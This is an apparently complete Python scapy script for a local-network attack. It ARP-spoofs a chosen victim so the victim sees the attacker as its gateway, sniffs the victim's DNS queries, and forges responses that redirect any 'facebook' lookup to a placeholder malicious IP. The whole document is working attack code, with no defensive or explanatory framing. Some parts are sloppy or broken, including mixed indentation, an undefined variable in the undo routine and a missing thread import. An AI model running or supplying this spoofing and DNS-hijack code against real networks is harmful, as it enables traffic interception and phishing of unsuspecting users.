#!/usr/bin/env python
from scapy.all import *
import sys
import signal
import netifaces

def buildpkt(pkt):

        if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0:
                ip = pkt.getlayer(IP)
                #udp = UDP()
                dns = pkt.getlayer(DNS)
                ip.src = pkt[IP].src
                ip.dst = pkt[IP].dst
                ip.sport = pkt[UDP].sport
                ip.dport = pkt[UDP].dport
                queryname = dns.qd.qname
		if "facebook" in queryname:
			print queryname
                	resp = IP(dst=ip.src, src=ip.dst)/UDP(dport=ip.sport,sport=ip.dport)/DNS(id=dns.id, qr=1, qd=dns.qd,an=DNSRR(rrname=queryname, ttl=10, rdata="<redir_to_mal_ip>"))
                	send(resp)

def undo_spoof():
        #packet = Ether()/ARP(op="who-has",hwsrc=gateway_mac,psrc=gateway_ip,pdst=victim_ip)
        sendp(packet, count=7, verbose=0)

def ctrlc_handler(signum, frm):
        #undo_spoof() - change to unspoof both gw and victim
        sys.exit()

def get_victim_mac(vict_ip):
        while True:
                arp_req = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=vict_ip, hwdst="ff:ff:ff:ff:ff:ff")
                arp_resp = srp1(arp_req, timeout=11, verbose=0)
                if arp_resp:
                        break

        return arp_resp.hwsrc

def get_gateway_mac(gw_ip):
        while True:
                arp_req = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=gw_ip, hwdst="ff:ff:ff:ff:ff:ff")
                arp_resp = srp1(arp_req, timeout=11, verbose=0)
                if arp_resp:
                        break

        return arp_resp.hwsrc


def get_my_ip(iface):
        if_addresses = netifaces.ifaddresses(iface)
        interface_info = if_addresses[socket.AF_INET][0]
        return interface_info["addr"]

def get_my_mac(iface):
        if_addresses = netifaces.ifaddresses(iface)
        interface_info = if_addresses[netifaces.AF_LINK]
        return interface_info[0]["addr"]

def arp_spoof_victim(pkt):
	send(spoofed_packet, loop=1, inter=0.3, verbose=0)


signal.signal(signal.SIGINT, ctrlc_handler)

interface = "eth1"
vct_ip = "<vict_priv_ip>"
vct_mac = get_victim_mac(vct_ip)
print "Received victim MAC: " + vct_mac
gw_ip = "<gw_priv_ip>"
gw_mac = get_gateway_mac(gw_ip)
print "Received gateway MAC: " + gw_mac
my_ip = get_my_ip(interface)
my_mac = get_my_mac(interface)
print "My " + interface + " MAC: " + my_mac

op=1
#spoof victim
print "Spoofing victim"
spoofed_packet = ARP(op=op,psrc=gw_ip,hwdst=vct_mac, pdst=vct_ip)

print "Starting victim ARP spoofing thread"
try:
   thread.start_new_thread(arp_spoof_victim,(spoofed_packet,))
   print "Victim spoofing thread started"
except:
   print "Error: unable to start victim spoofing thread"

while 1 :
        sniff(iface=interface,count=1,filter="udp port 53",prn=buildpkt)



